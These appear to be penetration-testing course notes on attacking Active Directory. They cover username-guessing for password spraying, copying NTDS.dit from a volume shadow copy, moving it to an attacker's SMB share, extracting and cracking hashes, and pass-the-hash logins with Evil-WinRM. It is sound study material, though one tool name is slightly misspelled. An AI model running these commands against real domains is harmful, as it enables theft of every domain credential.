### Dictionary Attacks against AD Accounts using NetExec
- Some organizations follow a naming convention when creating employee usernames

| Username convention                 | Practical example for `Jane Jill Doe` |
| ----------------------------------- | ------------------------------------- |
| `firstinitiallastname`              | jdoe                                  |
| `firstinitialmiddleinitiallastname` | jjdoe                                 |
| `firstnamelastname`                 | janedoe                               |
| `firstname.lastname`                | jane.doe                              |
| `lastname.firstname`                | doe.jane                              |
| `nickname`                          | doedoehacksstuff                      |
- **TIP**: We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn't disclosed, making password spraying harder. Sometimes you can use google dorks to search for "inlanefreight.com filetype:pdf" and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid

### Capturing NTDS.dit
- **NT Directory Services**
- The directory service used with AD to find & organize network resources.
- `NTDS.dit` file stored at %systemroot%/ntds on the domain controllers in a forest
- `.dit`: Stands for **directory information tree**
- Stores all domain usernames, password hashesm, and other critical schema information

1. **Connecting to a DC with Evil-WinRM**
	- `evil-winrm -i [target IP] -u [username] -p '[password]'`

2. **Checking Local Group Membership**
	- `net localgroup`

3. **Checking User Account Privileges Including Domain**
	- `net user [username]`

4. **Creating Shadow Copy of C:**
	- We can use `vssadmin` to create a **Volume Shadow Copy (VSS)** of the `C:` drive or whatever volume the admin chose when initially installing AD
	- `vssadmin CREATE SHADOW /For=C:`

5. **Copying NTDS.dit from the VSS**
	- `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`

6. **Transferring NTDS.dit to Attack Host**
	- `cmd.exe /c move C:\NTDS\NTDS.dit \\[personal machine IP]\CompData`

7. **Extracting Hashes from NTDS.dit**
	- `impacket-secretdump -ntds NTDS.dit -system SYSTEM LOCAL`

8. **A Faster Method: Using NetExec to Capture NTDS.dit (REPLACES STEPS 4 TO 7, but works in a different way)**
	- `netexec smb [target IP] -u [username] -p [password] -M ntdsutil`

### Cracking Hashes and Gaining Credentials
**Cracking a Single Hash with Hashcat**
- `sudo hashcat -m 1000 [hash] [rockyou.txt]`
- If we are unsuccessful in cracking a hash, we can use hashes to attempt to authenticate using **Pass-the-Hash (PtH)** attack

****
### Pass the Hash (PtH) Considerations
- Can be used if we fail in cracking a hash
- Takes advantage of the **NTLM authentication protocol to authenticate using password hash**
- `evil-winrm -i [target IP] -u Administrator(username) -H [password hash]`
